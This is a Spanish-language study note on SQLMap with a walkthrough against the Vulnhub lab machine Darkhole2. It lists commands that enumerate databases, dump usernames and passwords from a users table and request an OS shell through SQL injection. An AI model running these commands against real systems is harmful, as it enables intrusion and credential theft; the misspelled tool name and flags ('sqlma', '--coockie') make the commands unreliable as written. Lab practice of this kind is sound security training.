- Tags : #sqlmap #recursos_vulnhub 
**SQLMap** es una herramienta de pruebas de penetración de código abierto que se utiliza para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web. Esta herramienta se basa en un motor de inyección SQL altamente automatizado que puede detectar y explotar una amplia variedad de vulnerabilidades de inyección SQL en diferentes sistemas de gestión de bases de datos.

SQLMap se utiliza para probar la seguridad de aplicaciones web que utilizan bases de datos, identificando y aprovechando vulnerabilidades de inyección SQL. Para hacer esto, SQLMap realiza una exploración automatizada de la aplicación web, identifica las vulnerabilidades de inyección SQL y explota estas vulnerabilidades para extraer información de la base de datos. La información extraída puede incluir nombres de usuario, contraseñas y otra información confidencial que podría ser utilizada por un atacante malintencionado para comprometer la seguridad de la aplicación.

Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir las vulnerabilidades de inyección SQL en sus aplicaciones web, lo que mejora significativamente la seguridad de estas aplicaciones. También pueden utilizar SQLMap para realizar pruebas de penetración en aplicaciones web de terceros y así evaluar su nivel de seguridad. En general, SQLMap es una herramienta valiosa para cualquier profesional de la seguridad que trabaja en pruebas de penetración de aplicaciones web y en la detección de vulnerabilidades de inyección SQL.


**USO DE SQLMAP**

**Recurso**: Maquina Vulnhub Darkhole2 

```bash
sqlma -u url_vulnerable punto donde se efectuara el sql injection

#Enumerar las Bases de datos
sqlma -u 'http://192.168.12.111/dashhboard.php?id=1' --dbs

#Si necesitaramos una cookie de session se la agregamos
sqlma -u 'http://192.168.12.111/dashhboard.php?id=1' --dbs --coockie "NOMBRE_COOKIE=VALOR_COOKIE"

#Si sabemos el tipo de BD que esta corriendo por detras la indicamos para ahorrar tiempo 
sqlma -u 'http://192.168.12.111/dashhboard.php?id=1' --dbs --coockie "NOMBRE_COOKIE=VALOR_COOKIE" --dbms mysql


#Para evitar que haga preguntas y simplemente dumpee lo requerido agregamos --batch
sqlma -u 'http://192.168.12.111/dashhboard.php?id=1' --dbs --coockie "NOMBRE_COOKIE=VALOR_COOKIE" --dbms mysql --batch

```

![](../../../attachments/Pasted%20image%2020260226112818.png)

Teniendo los nombres de las bases de datos pues iremos por las  tablas , columnas y finalmente los datos

```bash
#Con la BD seleccionada buscaremos las tablas
sqlma -u 'http://192.168.12.111/dashhboard.php?id=1'  --coockie "NOMBRE_COOKIE=VALOR_COOKIE" --dbms mysql --batch -D darkhole_2 --tables
```

![](../../../attachments/Pasted%20image%2020260226113243.png)

Teniendo las tablas ahora enumeramos las columnas

```bash
#Con la BD seleccionada buscaremos las tablas
sqlma -u 'http://192.168.12.111/dashhboard.php?id=1'  --coockie "NOMBRE_COOKIE=VALOR_COOKIE" --dbms mysql --batch -D darkhole_2 -T users --columns
```

![](../../../attachments/Pasted%20image%2020260226113538.png)

Teniendo las columnas vamos por los datos 

```bash
#Con la BD seleccionada buscaremos las tablas
sqlma -u 'http://192.168.12.111/dashhboard.php?id=1'  --coockie "NOMBRE_COOKIE=VALOR_COOKIE" --dbms mysql --batch -D darkhole_2 -T users -C username,password --dump 
```

![](../../../attachments/Pasted%20image%2020260226113758.png)

Intentar obtener un shell de la base de datos

```bash
#Intentar connectarse a la shell 
sqlma -u 'http://192.168.12.111/dashhboard.php?id=1'  --coockie "NOMBRE_COOKIE=VALOR_COOKIE" --os-shell --batch
```